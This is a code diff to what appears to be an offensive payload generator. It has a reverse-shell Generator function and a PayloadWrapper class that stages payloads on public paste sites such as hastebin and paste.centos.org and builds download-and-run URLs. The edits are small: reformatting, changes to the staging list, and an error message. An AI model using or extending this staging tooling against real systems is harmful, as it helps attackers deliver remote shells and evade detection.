@@ -351,7 +351,8 @@ def Generator(host="127.0.0.1", port="44444", port2="", shell_type="bash", shell
                     ngrok_ssl = ssl.create_default_context()
                     ngrok_ssl.check_hostname = False
                     ngrok_ssl.verify_mode = ssl.CERT_NONE
-                    download_status = os.path.join(__import__('tempfile').gettempdir(), str(__import__('time').time())[0:7])
+                    download_status = os.path.join(__import__('tempfile').gettempdir(),
+                                                   str(__import__('time').time())[0:7])
                     if not os.path.exists(download_status):
                         with open(download_status, 'w') as f:
                             f.write('')
@@ -675,6 +676,7 @@ class PayloadWrapper:
                         "9": {"url": "https://www.toptal.com",
                               "api": "https://www.toptal.com/developers/hastebin/documents", "method": "post"},
                         "10": {"url": "https://paste.centos.org", "api": "https://paste.centos.org/", "method": "post"},
+                        # "11": {"url": "https://glot.io", "api": "https://glot.io/new/python", "method": "post"},
 
                         }
         headers = '''{{
@@ -698,7 +700,7 @@ class PayloadWrapper:
             i = staging_url
             staging_api = staging_apis[i]["api"]
             headers = json.loads(headers.format(staging_apis[i]["url"], staging_apis[i]["url"]))
-            if staging_url in ["0", "1", "2", "5", "7", "9", "11"]:
+            if staging_url in ["0", "1", "2", "5", "7", "9"]:
                 data_dict = payloads_dict
             else:
                 for name, payload in payloads_dict.items():
@@ -712,7 +714,7 @@ class PayloadWrapper:
             try:
                 if staging_url in ["8", "10"]:
                     payload_url_dict = self.request2(staging_api, "post", headers, data_dict)
-                elif staging_apis[i]["method"] == "socket":
+                elif staging_url in ["0", "7"]:
                     host = staging_apis[i]["api"].split(":")[0]
                     port = staging_apis[i]["api"].split(":")[1]
                     payload_url_dict = self.socket(host, port, data_dict)
@@ -742,7 +744,7 @@ class PayloadWrapper:
                     elif staging_url == "10":
                         payload_url = payload_url.replace("/view/", "/view/raw/")
                     else:
-                        print("test", payload_url)
+                        print("error", payload_url)
                     staged_payload_dict[name] = self.urlWrapper(staging_cmd, payload_url) + "|" + shell_path
         else:
             for name, payload_url in payloads_dict.items():
